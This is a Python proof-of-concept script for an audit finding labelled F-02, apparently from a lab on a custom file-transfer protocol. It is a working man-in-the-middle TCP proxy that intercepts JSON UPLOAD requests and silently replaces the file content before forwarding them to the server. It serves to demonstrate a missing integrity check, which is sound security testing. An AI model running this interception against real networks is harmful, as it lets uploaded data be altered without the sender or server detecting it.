#!/usr/bin/env python3
"""
mitm_F02.py - Upload Content Tampering
Finding: F-02
Violated: R5
The MITM intercepts UPLOAD requests and replaces the file content
before forwarding to the server. The client never detects the substitution.
"""

import socket
import threading
import json

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

REPLACEMENT_CONTENT = "*** THIS FILE HAS BEEN TAMPERED WITH BY THE MITM ***"


def forward(src, dst, label, transform=None):
    buf = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if transform:
                        obj = transform(obj, label)
                    line = json.dumps(obj).encode("utf-8")
                except Exception:
                    pass
                dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def tamper(obj, label):
    if label == "C->S" and obj.get("action") == "UPLOAD":
        original = obj.get("content", "")
        obj["content"] = REPLACEMENT_CONTENT
        print(f"\n[F-02 TAMPER] UPLOAD intercepted.")
        print(f"  Original content : {repr(original)}")
        print(f"  Replaced with    : {repr(REPLACEMENT_CONTENT)}\n")
    return obj


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock, "C->S", tamper), daemon=True)
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock, "S->C", None), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-02] Upload tampering active...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
